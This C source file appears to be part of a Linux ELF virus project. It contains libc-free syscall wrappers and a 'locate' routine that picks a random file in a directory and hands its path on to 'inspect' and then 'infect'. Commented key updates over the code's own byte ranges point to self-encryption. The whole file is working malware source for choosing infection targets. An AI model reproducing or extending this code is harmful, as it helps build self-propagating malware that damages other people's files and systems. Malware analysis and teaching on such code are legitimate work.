#include "war.h"

__INLINE__ static void	*_memcpy(void *d, void *s, size_t size)
{
	char *s1 = d;
	char *s2 = s;

	for (size_t n = 0 ; n < size ; n++)
		s1[n] = s2[n];
	return (s1);
}

__INLINE__ static size_t	_strlen(char *s)
{
	size_t ret = 0;

	if (s)
	{
		while (s[ret])
			ret++;
	}
	return (ret);
}

__INLINE__ static int		_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
	long ret;

	__asm__ __volatile__ (
		"mov edi, %0;"
		"mov rsi, %1;"
		"mov edx, %2;"
		"mov rax, 217;"
		"syscall" :: "g"(fd), "g"(dirp), "g"(count)
		);
	__asm__ __volatile__ (
		"mov %0, rax" : "=r"(ret)
		);

	return ((int)ret);
}

__INLINE__ static ssize_t	_get_random(void *buf, size_t buflen, unsigned int flags)
{
	ssize_t ret;

	__asm__ __volatile__ (
		"mov rdi, %0;"
		"mov rsi, %1;"
		"mov edx, %2;"
		"mov rax, 318;"
		"syscall" :: "g" (buf), "g" (buflen), "g" (flags)
		);

	__asm__ __volatile__ (
		"mov %0, rax;" : "=r" (ret)
		);
	return (ret);
}

__INLINE__ static int         _random_number(int limit)
{
	uint8_t val[4];

	if (_get_random(val, 4, 0) < 0)
		return (0);
	return ((int)*val % limit);
}


void	locate(t_data *data, t_directory *dir)
{
//	revert_one(&data->key, (char*)war, (size_t)locate - (size_t)war);
	update_one(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
//	printf("locate key = %lx\n", data->key.one);

	int				fd;
	int				stop;
	int				limit;
	char			buf[PATH_MAX];
	char			path[BUFF_SIZE] = {0};
	linux_dirent64 *curr = NULL;

	data->context = false;
	if (_memcpy(path, dir->path[dir->entry], _strlen(dir->path[dir->entry])) != path)
		goto ERR;
	if ((fd = open(path, O_RDONLY)) < 0)
		goto ERR;
   	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		for (register int i = 0 ; i < limit ; i += curr->d_reclen)
		{
			curr = (struct linux_dirent64 *)(buf + i);
			dir->entry++;
		}
	}
	if (close(fd) < 0)
		goto ERR;
	if (dir->entry <= 0)
		goto ERR;

ITER:
	if ((fd = open(path, O_RDONLY)) < 0)
		goto ERR;
	if ((stop = _random_number(dir->entry)) < 0)
		goto ERR;
	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		for (register int i = 0 ; i < limit ; i += curr->d_reclen)
		{
			curr = (struct linux_dirent64 *)(buf + i);
			if (stop == 0)
				break ;
			stop--;
		}
		if (stop == 0)
			break ;
	}
	if (close(fd) < 0)
		goto ERR;
	if (*curr->d_name == '.')
		goto ITER;

	limit = _strlen(path);
	path[limit++] = '/';
	if (_memcpy(path + limit, curr->d_name, _strlen(curr->d_name)) != path + limit)
		goto ERR;
	data->context = true;

ERR:
//	revert_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
	inspect(data, path);
}
